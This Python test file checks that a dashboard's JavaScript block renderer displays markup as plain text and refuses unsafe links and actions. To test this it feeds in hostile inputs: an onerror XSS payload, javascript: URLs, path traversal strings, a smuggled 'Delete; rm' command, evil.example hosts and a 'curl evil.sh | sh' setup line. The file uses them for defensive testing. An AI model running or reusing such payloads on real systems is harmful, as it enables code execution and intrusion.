import json
import shutil
import subprocess
from pathlib import Path

import pytest

from . import webjs
from .conftest import VIEW

WEB = Path(__file__).resolve().parents[1] / "src" / "orch_dashboard" / "web"
HARNESS = Path(__file__).parent / "blocks_harness.js"
node = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def run(tmp_path, view, urls=None, own=None, inapp=False, links=False):
    f = tmp_path / "v.json"
    f.write_text(json.dumps(view))
    extra = [own or "", "inapp"] if inapp else ([own] if own else [])
    out = subprocess.run(
        ["node", str(HARNESS), str(WEB / "blocks.js"), str(f), json.dumps(urls or {}), *extra],
        capture_output=True,
        text=True,
        check=True,
        env={**__import__("os").environ, "LINKS": "1" if links else "0"},
    )
    return json.loads(out.stdout)


def walk(n):
    yield n
    for k in n["kids"]:
        yield from walk(k)


def texts(n):
    return " ".join(x["text"] for x in walk(n) if x["text"])


def test_blocks_js_never_builds_html():
    js = (WEB / "blocks.js").read_text()
    for bad in ("innerHTML", "insertAdjacentHTML", "outerHTML", "document.write", "eval(", "style="):
        assert bad not in js, bad


@node
def test_all_six_block_types_render(tmp_path):
    tree = run(tmp_path, json.loads(VIEW.read_text()))
    classes = " ".join(x["cls"] for x in walk(tree))
    for want in ("stats", "stat-value", "strip", "day", "blk-list", "blk-timeline", "blk-table", "chips"):
        assert want in classes, want
    t = texts(tree)
    assert "Weekly report" in t and "Next run" in t and "5 min" in t  # duration 312 s
    assert "Failed" in t  # tone is a word as well as a colour


@node
def test_links_are_ticket_ids_or_https_only(tmp_path):
    v = json.loads(VIEW.read_text())
    v["blocks"][4]["items"][0]["link"] = (
        "javascript:alert(1)"  # the app checked it already; the renderer must not trust it
    )
    v["blocks"][4]["items"].append({"title": "x", "link": "https://example.com/a"})
    tree = run(tmp_path, v)
    hrefs = [x["attrs"]["href"] for x in walk(tree) if "href" in x["attrs"] and x["tag"] == "a"]
    assert hrefs and all(h.startswith(("#ticket/t_", "https://")) for h in hrefs)
    ext = [x for x in walk(tree) if x["tag"] == "a" and x["attrs"].get("href", "").startswith("https://")]
    assert ext and all(
        x["attrs"]["target"] == "_blank" and x["attrs"]["rel"] == "noopener noreferrer" for x in ext
    )


@node
def test_text_is_text_not_markup(tmp_path):
    v = {
        "blocks": [
            {"type": "list", "title": "T", "items": [{"title": "<img src=x onerror=alert(1)>"}]},
            {"type": "hologram"},
            {"type": "stat", "label": "a", "value": 3},
        ]
    }
    tree = run(tmp_path, v)
    assert "<img src=x onerror=alert(1)>" in texts(tree)  # shown as words
    assert not any(x["tag"] == "img" for x in walk(tree)) and not any(
        x["tag"] == "hologram" for x in walk(tree)
    )


@node
def test_calendar_repeat_item_shows_every_and_note(tmp_path):
    v = {
        "blocks": [
            {
                "type": "calendar",
                "days": [
                    {
                        "date": "2026-11-05",
                        "items": [
                            {
                                "time": "15:05",
                                "every": "Every 5 min",
                                "title": "TEST: pick a word",
                                "note": "next 15:05 · 288 runs/day",
                                "link": "t_wd5m0001",
                            }
                        ],
                    }
                ],
            }
        ]
    }
    tree = run(tmp_path, v)
    runs = [x for x in walk(tree) if "run" in x["cls"].split()]
    assert len(runs) == 1 and "repeat" in runs[0]["cls"]
    t = texts(runs[0])
    assert "Every 5 min" in t and "TEST: pick a word" in t and "288 runs/day" in t and "15:05 " not in t[:6]


ACCORDION = {
    "blocks": [
        {
            "type": "list",
            "title": "Schedules",
            "items": [
                {
                    "title": "Month-end check",
                    "subtitle": "Every weekday at 08:00",
                    "toggle": {
                        "on": True,
                        "label": "Month-end check on or off",
                        "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_mec009"}},
                    },
                    "detail": [
                        {"label": "Repeats", "value": "Every weekday"},
                        {
                            "label": "Webhook address",
                            "value": "https://hooks.example.org/w/abc",
                            "copy": True,
                        },
                        {"label": "Recent", "lines": ["14:08 started a run", "11:30 started a run"]},
                    ],
                    "tickets": [
                        {
                            "id": "t_mec009",
                            "key": "MEC-0009",
                            "title": "Reconcile bank balance",
                            "status": {"label": "Blocked", "tone": "warn"},
                        }
                    ],
                    "actions": [
                        {
                            "label": "Run now",
                            "action": {"op": "addon.act", "args": {"verb": "run", "target": "t_mec009"}},
                        },
                        {
                            "label": "Delete",
                            "tone": "bad",
                            "confirm": "Delete this schedule?",
                            "action": {"op": "addon.act", "args": {"verb": "delete", "target": "t_mec009"}},
                        },
                    ],
                }
            ],
        }
    ]
}


@node
def test_accordion_row_has_detail_tickets_switch_and_confirm_buttons(tmp_path):
    tree = run(tmp_path, ACCORDION)
    nodes = list(walk(tree))
    det = [n for n in nodes if n["tag"] == "details"]
    assert len(det) == 1 and det[0]["data"]["key"].startswith("acc-")
    t = texts(tree)
    assert (
        "Repeats" in t
        and "14:08 started a run" in t
        and "Reconcile bank balance" in t
        and "MEC-0009" in t
        and "Blocked" in t
    )
    sw = [n for n in nodes if n["attrs"].get("role") == "switch"]
    assert (
        len(sw) == 1
        and sw[0]["attrs"]["aria-checked"] == "true"
        and sw[0]["data"]
        == {"addonAct": "true", "verb": "toggle", "target": "t_mec009", "label": "Month-end check on or off"}
    )
    btns = {n["text"]: n["data"] for n in nodes if n["tag"] == "button" and n["data"].get("addonAct")}
    assert btns["Delete"]["confirm"] == "Delete this schedule?" and "confirm" not in btns["Run now"]
    cp = [n for n in nodes if n["data"].get("copy")]
    assert cp and cp[0]["data"]["copy"] == "https://hooks.example.org/w/abc" and cp[0]["text"] == "Copy"
    links = [n["attrs"]["href"] for n in nodes if n["tag"] == "a"]
    assert links == ["#ticket/t_mec009"]


@node
def test_accordion_actions_other_than_the_one_generic_op_are_not_drawn(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    it = v["blocks"][0]["items"][0]
    it["actions"][0]["action"] = {"op": "run.start", "args": {"verb": "run", "target": "t_mec009"}}
    it["actions"][1]["action"]["args"]["verb"] = "Delete; rm"
    it["toggle"]["action"]["args"]["target"] = "../x"
    tree = run(tmp_path, v)
    nodes = list(walk(tree))
    assert not any(n["data"].get("addonAct") for n in nodes)
    assert not any(n["attrs"].get("role") == "switch" for n in nodes)


@node
def test_accordion_text_is_text(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    v["blocks"][0]["items"][0]["detail"][0]["value"] = "<img src=x onerror=alert(1)>"
    tree = run(tmp_path, v)
    assert "<img src=x onerror=alert(1)>" in texts(tree) and not any(n["tag"] == "img" for n in walk(tree))


@node
def test_copy_button_only_for_a_shown_value(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    v["blocks"][0]["items"][0]["detail"] = [
        {"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}
    ]
    tree = run(tmp_path, v)
    assert not any(n["data"].get("copy") for n in walk(tree)) and "Daily at 9" in texts(tree)


ADDON_LINK = {
    "blocks": [{"type": "list", "title": "T", "items": [{"title": "Board", "link": "addon:panel/board"}]}]
}


@node
def test_addon_link_opens_the_running_page_or_offers_start(tmp_path):
    on = run(tmp_path, ADDON_LINK, {"panel": "http://127.0.0.1:8500"})
    a = [n for n in walk(on) if n["tag"] == "a"]
    assert (
        a
        and a[0]["attrs"]["href"] == "http://127.0.0.1:8500/board"
        and a[0]["attrs"]["rel"] == "noopener noreferrer"
    )
    off = run(tmp_path, ADDON_LINK)
    b = [n for n in walk(off) if n["tag"] == "button"]
    assert (
        b
        and b[0]["data"]["action"] == "start"
        and "Start panel" in texts(off)
        and not any(n["tag"] == "a" for n in walk(off))
    )


@node
def test_addon_link_never_points_off_this_computer(tmp_path):
    for bad in (
        "https://evil.example",
        "http://evil.example:80",
        "javascript:alert(1)",
        "http://127.0.0.1.evil.example:80",
    ):
        t = run(tmp_path, ADDON_LINK, {"panel": bad})
        assert not any(n["tag"] == "a" for n in walk(t)), bad
    traversal = {
        "blocks": [{"type": "list", "title": "T", "items": [{"title": "x", "link": "addon:panel/../../etc"}]}]
    }
    assert not any(
        n["tag"] == "a" and n["attrs"].get("href", "").startswith("http")
        for n in walk(run(tmp_path, traversal, {"panel": "http://127.0.0.1:1"}))
    )


@node
def test_own_page_link_resolves_against_this_addon(tmp_path):
    """Focus emits `addon:t/<ticket>`: a page of the add-on whose view this is (schema), not an add-on named `t`."""
    view = {
        "blocks": [{"type": "list", "title": "T", "items": [{"title": "Run", "link": "addon:t/t_abc12345"}]}]
    }
    a = [
        n
        for n in walk(run(tmp_path, view, {"focus": "http://127.0.0.1:8500"}, own="focus"))
        if n["tag"] == "a"
    ]
    assert a and a[0]["attrs"]["href"] == "http://127.0.0.1:8500/t/t_abc12345"
    off = run(tmp_path, view, own="focus")
    assert "Start focus" in texts(off)


@node
def test_an_addon_page_shown_inside_the_app_opens_there_not_in_a_new_tab(tmp_path):
    """Focus rows open the ticket's Focus page inside the dashboard (#open/focus/t/<id>) when it runs."""
    view = {
        "blocks": [{"type": "list", "title": "T", "items": [{"title": "Run", "link": "addon:t/t_abc12345"}]}]
    }
    a = [
        n
        for n in walk(run(tmp_path, view, {"focus": "http://127.0.0.1:8500"}, own="focus", inapp=True))
        if n["tag"] == "a"
    ]
    assert a and a[0]["attrs"]["href"] == "#open/focus/t/t_abc12345" and "target" not in a[0]["attrs"]
    assert "Start focus" in texts(
        run(tmp_path, view, own="focus", inapp=True)
    )  # not running: still offers Start


def test_settings_general_panel_holds_look_name_folder_and_share_together():
    """panel(id, body) takes ONE body: the General panel must pass an array, or all but the first part is dropped."""
    src = webjs.all_js()
    start = src.index("panel('general', ")
    end = src.index("panel('agent', ", start)
    part = src[start:end]
    assert part.startswith("panel('general', [") and part.rstrip().endswith("]),")
    for want in ("OrchLook?.settingsSection()", "'Name'", "'Folder'", "shareCard(settings)"):
        assert want in part, want
    assert (
        "const panel = (id, body) =>" in src[: src.index("function settingsPage")]
        or "const panel = (id, body) =>" in src
    )


def _page(name):
    return json.loads(
        (Path(__file__).resolve().parents[3] / "contracts" / "examples" / "addon-view" / name).read_text()
    )


@node
def test_page_layout_blocks_render(tmp_path):
    """Schedules page: heading quiet text, an Edit button on the row, the empty state and the footnote."""
    tree = run(tmp_path, _page("valid-schedules-page.json"))
    t = texts(tree)
    assert "Coming up" in t and "13-19 November" in t and "Recent runs" in t and "Latest activity" in t
    assert "Nothing has run yet" in t and "Manage incoming work" in t
    edit = [x for x in walk(tree) if x["data"].get("addonEdit")]
    assert [x["data"]["addonEdit"] for x in edit] == ["t_abc12345"] and edit[0]["text"] == "Edit"
    hrefs = [x["attrs"]["href"] for x in walk(tree) if x["tag"] == "a" and "href" in x["attrs"]]
    assert "#addon/relay" in hrefs  # an app: link is a hash route of the dashboard, nothing else


@node
def test_messages_page_pairs_half_lists_with_empty_states(tmp_path):
    tree = run(tmp_path, _page("valid-messages-page.json"))
    pairs = [x for x in walk(tree) if x["cls"] == "blk-pair"]
    assert len(pairs) == 1 and len(pairs[0]["kids"]) == 2
    t = texts(tree)
    assert "No messages yet" in t and "No workspaces allowed" in t and "Open phone settings" in t
    assert "Allow a workspace" in t


@node
def test_settings_card_holds_the_radio_choice(tmp_path):
    tree = run(tmp_path, _page("valid-sync-page.json"))
    cards = [x for x in walk(tree) if x["cls"] == "blk blk-settings"]
    assert len(cards) == 1
    inside = list(walk(cards[0]))
    radios = [x for x in inside if x["tag"] == "input"]
    assert len(radios) == 3 and [x["data"]["selected"] for x in radios] == ["true", "false", "false"]
    assert [x["data"].get("radioTarget") for x in radios[:2]] == ["off", "local"]
    assert radios[2]["data"]["radioGo"] == "settings"
    assert "Current setting" in texts(cards[0]) and "Where to keep a copy" in texts(cards[0])


@node
def test_compact_list_has_row_actions_for_shared_links(tmp_path):
    tree = run(tmp_path, _page("valid-links-page.json"), links=True)
    btns = [x for x in walk(tree) if x["data"].get("native")]
    assert [(x["data"]["native"], x["data"]["linkId"]) for x in btns] == [
        ("link-copy", "f_abc123"),
        ("link-extend", "f_abc123"),
        ("link-stop", "f_abc123"),
    ]
    assert "Anyone with the link" in texts(tree) and "Expires 13 Dec 2026, 12:47" in texts(tree)


@node
def test_unsafe_ops_and_links_are_not_drawn(tmp_path):
    v = {
        "blocks": [
            {
                "type": "list",
                "title": "T",
                "compact": True,
                "items": [
                    {
                        "title": "x",
                        "actions": [
                            {"label": "A", "action": {"op": "link.stop", "args": {"id": "../etc"}}},
                            {"label": "B", "action": {"op": "addon.edit", "args": {"target": "../x"}}},
                            {"label": "C", "action": {"op": "shell.run", "args": {}}},
                        ],
                    }
                ],
            },
            {"type": "footnote", "text": "x", "link": {"label": "Go", "to": "app:evil/x"}},
            {
                "type": "radio",
                "title": "R",
                "options": [
                    {
                        "label": "a",
                        "selected": True,
                        "action": {"op": "addon.act", "args": {"verb": "set", "target": "../x"}},
                    },
                    {"label": "b", "selected": False},
                ],
            },
        ]
    }
    tree = run(tmp_path, v)
    assert not [x for x in walk(tree) if x["tag"] == "button"]
    assert not [x for x in walk(tree) if x["tag"] == "a"]
    assert all(
        x["attrs"].get("disabled") is None and not x["data"].get("radioVerb")
        for x in walk(tree)
        if x["tag"] == "input"
    )


def test_new_examples_pass_both_checks_and_bad_ones_fail_both():
    import jsonschema

    from orch_dashboard.views import check_view

    folder = Path(__file__).resolve().parents[3] / "contracts" / "examples" / "addon-view"
    schema = json.loads((folder.parents[1] / "addon-view.schema.json").read_text())
    validator = jsonschema.Draft202012Validator(schema, format_checker=jsonschema.FormatChecker())
    for f in sorted(folder.glob("*.json")):
        v = json.loads(f.read_text())
        good = not list(validator.iter_errors(v))
        assert good == f.name.startswith("valid-"), f.name
        if f.name in ("invalid-action-button.json",):  # unknown ops are dropped on screen, not by this check
            continue
        assert (check_view(v) is not None) == good, f.name


@node
def test_link_ops_only_exist_on_the_links_page_with_fixed_labels(tmp_path):
    page = _page("valid-links-page.json")
    assert not [x for x in walk(run(tmp_path, page)) if x["tag"] == "button"]  # any other add-on's view
    page["blocks"][0]["items"][0]["actions"][0]["label"] = "Free money"
    tree = run(tmp_path, page, links=True)
    assert [x["text"] for x in walk(tree) if x["data"].get("native")] == [
        "Copy link",
        "Extend",
        "Stop sharing",
    ]
    # inside an accordion the label is fixed too, and a switch never carries a link op
    ops = {"op": "link.stop", "args": {"id": "f_abc123"}}
    acc = {
        "blocks": [
            {
                "type": "list",
                "title": "T",
                "items": [
                    {"title": "x", "actions": [{"label": "Free money", "action": ops}]},
                    {"title": "y", "toggle": {"on": True, "label": "Free money", "action": ops}},
                ],
            }
        ]
    }
    tree = run(tmp_path, acc, links=True)
    assert [x["text"] for x in walk(tree) if x["data"].get("native")] == ["Stop sharing"]
    assert "Free money" not in texts(tree) and not [
        x for x in walk(tree) if x["attrs"].get("role") == "switch"
    ]


def test_the_panel_of_a_manifest_does_not_earn_the_link_controls():
    src = webjs.all_js()
    assert "a.name === 'publish' && a.shipped === true" in src
    assert "panelOf(id) === 'links'" not in src


@node
def test_allow_on_this_computer_is_drawn_only_for_a_ticket_id(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    acts = v["blocks"][0]["items"][0]["actions"]
    acts[0] = {"label": "Allow on this computer", "action": {"op": "addon.allow", "args": {"target": "t_mec009"}}}
    acts[1] = {"label": "Bad", "action": {"op": "addon.allow", "args": {"target": "../x"}}}
    nodes = list(walk(run(tmp_path, v)))
    allow = [n for n in nodes if n["tag"] == "button" and n["data"].get("syncAllow")]
    assert [n["data"]["syncAllow"] for n in allow] == ["t_mec009"]
    assert not any(n["text"] == "Bad" for n in nodes)
